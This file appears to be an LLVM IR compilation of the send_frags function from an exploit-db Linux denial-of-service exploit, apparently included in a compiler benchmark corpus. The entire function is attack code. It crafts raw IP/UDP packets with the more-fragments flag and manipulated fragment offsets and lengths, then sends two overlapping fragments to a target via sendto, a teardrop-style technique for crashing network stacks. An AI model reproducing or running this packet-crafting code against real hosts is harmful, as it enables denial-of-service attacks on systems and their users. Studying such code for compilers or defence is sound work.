; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19301.c_send_frags.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19301.c_send_frags.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@IPH = common dso_local global i32 0, align 4
@UDPH = common dso_local global i32 0, align 4
@PADDING = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"\0Asendto\00", align 1
@MAGIC = common dso_local global i32 0, align 4
@FRAG2 = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_frags(i32 %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  store i32* null, i32** %11, align 8
  store i32* null, i32** %12, align 8
  %15 = load i32, i32* @AF_INET, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %15, i32* %16, align 4
  %17 = load i32, i32* %9, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i32 %17, i32* %18, align 4
  %19 = load i32, i32* %8, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %21 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = load i32, i32* @IPH, align 4
  %23 = load i32, i32* @UDPH, align 4
  %24 = add nsw i32 %22, %23
  %25 = load i32, i32* @PADDING, align 4
  %26 = add nsw i32 %24, %25
  %27 = call i64 @malloc(i32 %26)
  %28 = inttoptr i64 %27 to i32*
  store i32* %28, i32** %11, align 8
  %29 = load i32*, i32** %11, align 8
  store i32* %29, i32** %12, align 8
  %30 = load i32*, i32** %12, align 8
  %31 = load i32, i32* @IPH, align 4
  %32 = load i32, i32* @UDPH, align 4
  %33 = add nsw i32 %31, %32
  %34 = load i32, i32* @PADDING, align 4
  %35 = add nsw i32 %33, %34
  %36 = call i32 @bzero(i32* %30, i32 %35)
  store i32 69, i32* %13, align 4
  %37 = load i32*, i32** %12, align 8
  %38 = call i32 @memcpy(i32* %37, i32* %13, i32 4)
  %39 = load i32*, i32** %12, align 8
  %40 = getelementptr inbounds i32, i32* %39, i64 2
  store i32* %40, i32** %12, align 8
  %41 = load i32, i32* @IPH, align 4
  %42 = load i32, i32* @UDPH, align 4
  %43 = add nsw i32 %41, %42
  %44 = load i32, i32* @PADDING, align 4
  %45 = add nsw i32 %43, %44
  %46 = call i32 @htons(i32 %45)
  %47 = load i32*, i32** %12, align 8
  store i32 %46, i32* %47, align 4
  %48 = load i32*, i32** %12, align 8
  %49 = getelementptr inbounds i32, i32* %48, i64 2
  store i32* %49, i32** %12, align 8
  %50 = call i32 @htons(i32 242)
  %51 = load i32*, i32** %12, align 8
  store i32 %50, i32* %51, align 4
  %52 = load i32*, i32** %12, align 8
  %53 = getelementptr inbounds i32, i32* %52, i64 2
  store i32* %53, i32** %12, align 8
  %54 = load i32, i32* @IP_MF, align 4
  %55 = call i32 @htons(i32 %54)
  %56 = load i32*, i32** %12, align 8
  %57 = load i32, i32* %56, align 4
  %58 = or i32 %57, %55
  store i32 %58, i32* %56, align 4
  %59 = load i32*, i32** %12, align 8
  %60 = getelementptr inbounds i32, i32* %59, i64 2
  store i32* %60, i32** %12, align 8
  %61 = load i32*, i32** %12, align 8
  store i32 64, i32* %61, align 4
  %62 = load i32, i32* @IPPROTO_UDP, align 4
  store i32 %62, i32* %13, align 4
  %63 = load i32*, i32** %12, align 8
  %64 = getelementptr inbounds i32, i32* %63, i64 1
  %65 = call i32 @memcpy(i32* %64, i32* %13, i32 4)
  %66 = load i32*, i32** %12, align 8
  %67 = getelementptr inbounds i32, i32* %66, i64 4
  store i32* %67, i32** %12, align 8
  %68 = load i32, i32* %7, align 4
  %69 = load i32*, i32** %12, align 8
  store i32 %68, i32* %69, align 4
  %70 = load i32*, i32** %12, align 8
  %71 = getelementptr inbounds i32, i32* %70, i64 4
  store i32* %71, i32** %12, align 8
  %72 = load i32, i32* %8, align 4
  %73 = load i32*, i32** %12, align 8
  store i32 %72, i32* %73, align 4
  %74 = load i32*, i32** %12, align 8
  %75 = getelementptr inbounds i32, i32* %74, i64 4
  store i32* %75, i32** %12, align 8
  %76 = load i32, i32* %9, align 4
  %77 = call i32 @htons(i32 %76)
  %78 = load i32*, i32** %12, align 8
  store i32 %77, i32* %78, align 4
  %79 = load i32*, i32** %12, align 8
  %80 = getelementptr inbounds i32, i32* %79, i64 2
  store i32* %80, i32** %12, align 8
  %81 = load i32, i32* %10, align 4
  %82 = call i32 @htons(i32 %81)
  %83 = load i32*, i32** %12, align 8
  store i32 %82, i32* %83, align 4
  %84 = load i32*, i32** %12, align 8
  %85 = getelementptr inbounds i32, i32* %84, i64 2
  store i32* %85, i32** %12, align 8
  %86 = load i32, i32* @PADDING, align 4
  %87 = add nsw i32 8, %86
  %88 = call i32 @htons(i32 %87)
  %89 = load i32*, i32** %12, align 8
  store i32 %88, i32* %89, align 4
  %90 = load i32, i32* %6, align 4
  %91 = load i32*, i32** %11, align 8
  %92 = load i32, i32* @IPH, align 4
  %93 = load i32, i32* @UDPH, align 4
  %94 = add nsw i32 %92, %93
  %95 = load i32, i32* @PADDING, align 4
  %96 = add nsw i32 %94, %95
  %97 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %98 = call i32 @sendto(i32 %90, i32* %91, i32 %96, i32 0, %struct.sockaddr* %97, i32 4)
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %105

100:                                              ; preds = %5
  %101 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %102 = load i32*, i32** %11, align 8
  %103 = call i32 @free(i32* %102)
  %104 = call i32 @exit(i32 1) #3
  unreachable

105:                                              ; preds = %5
  %106 = load i32*, i32** %11, align 8
  %107 = getelementptr inbounds i32, i32* %106, i64 2
  store i32* %107, i32** %12, align 8
  %108 = load i32, i32* @IPH, align 4
  %109 = load i32, i32* @MAGIC, align 4
  %110 = add nsw i32 %108, %109
  %111 = add nsw i32 %110, 1
  %112 = call i32 @htons(i32 %111)
  %113 = load i32*, i32** %12, align 8
  store i32 %112, i32* %113, align 4
  %114 = load i32*, i32** %12, align 8
  %115 = getelementptr inbounds i32, i32* %114, i64 4
  store i32* %115, i32** %12, align 8
  %116 = load i32, i32* @FRAG2, align 4
  %117 = call i32 @htons(i32 %116)
  %118 = load i32*, i32** %12, align 8
  store i32 %117, i32* %118, align 4
  %119 = load i32, i32* %6, align 4
  %120 = load i32*, i32** %11, align 8
  %121 = load i32, i32* @IPH, align 4
  %122 = load i32, i32* @MAGIC, align 4
  %123 = add nsw i32 %121, %122
  %124 = add nsw i32 %123, 1
  %125 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %126 = call i32 @sendto(i32 %119, i32* %120, i32 %124, i32 0, %struct.sockaddr* %125, i32 4)
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %133

128:                                              ; preds = %105
  %129 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %130 = load i32*, i32** %11, align 8
  %131 = call i32 @free(i32* %130)
  %132 = call i32 @exit(i32 1) #3
  unreachable

133:                                              ; preds = %105
  %134 = load i32*, i32** %11, align 8
  %135 = call i32 @free(i32* %134)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @sendto(i32, i32*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @free(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
